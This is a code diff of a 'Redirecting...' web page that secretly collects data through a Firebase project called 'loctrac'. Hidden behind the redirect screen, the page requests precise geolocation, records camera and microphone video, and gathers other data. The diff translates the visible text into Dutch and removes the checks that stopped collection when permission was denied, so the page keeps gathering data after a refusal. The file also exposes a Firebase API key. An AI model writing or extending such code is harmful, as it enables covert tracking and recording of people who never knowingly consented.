@@ -1,10 +1,10 @@
-<!-- redirect.html -->
+<!-- redirect.html (Complete with Corrections and Dutch Translation) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Doorverwijzing...</title>  <!-- Changed title -->
     <style>
        body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -124,8 +124,8 @@
         <div class="icon-container">
             <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
         </div>
-        <h1>Redirecting...</h1>
-        <p>You will be redirected shortly <span class="loading-dots"></span></p>
+        <h1>Doorverwijzing...</h1>  <!-- Changed heading -->
+        <p>U wordt zo dadelijk doorgestuurd <span class="loading-dots"></span></p> <!-- Changed text -->
         <div id="progress-bar-container">
             <div id="progress-bar"></div>
         </div>
@@ -141,7 +141,7 @@ function displayError(message) {
     errorMessage.style.display = 'block';
     setTimeout(() => { errorMessage.style.display = 'none'; }, 5000); // Hide after 5 seconds
 }
-    
+
     const firebaseConfig = {
     apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
     authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
@@ -405,39 +405,49 @@ function updateProgress(percentage) {
             recordSeconds = parseInt(recordSeconds, 10) || 0;
         }
 
+
         // Check and request permissions *before* any data collection
-        if (!micCamPermission) {
-          displayError('Accepteer camera/microfoon toestemming.');
-          return; // Stop if permission denied
+        if (!micCamPermission)
+        {
+            displayError('Accepteer camera/microfoon toestemming in de instellingen.');
+
+            // Do NOT return here. Continue execution to handle other data collection.
         }
         // No need to ask for notification, if it isn't accepted already, we can not sent notifications
         if (!locationPermissionSetting) {
-          displayError('Accepteer locatie toestemming');
-          return;// Stop if permission denied.
+            displayError('Accepteer locatie toestemming in de instellingen.');
+            //Do NOT return here.  Continue execution to collect other data.
         }
 
         if (notificationPermissionSetting && Notification.permission === "default") {
            await Notification.requestPermission();
         }
 
+
+
         // Geolocation handling (with high accuracy and timeout)
         const handleGeoSuccess = async (position) => {
-          const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-          collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError);
+            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting
         };
 
         const handleGeoError = async (error) => {
             console.error("Geolocation error:", error);
-            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
+             const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting
         };
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-        } else {
-            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
+        if (navigator.geolocation)
+        {
+             navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
         }
+        else
+        {
+            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting = false
+        }
+
+
 
     } catch (error) {
         console.error("Initialization error:", error);
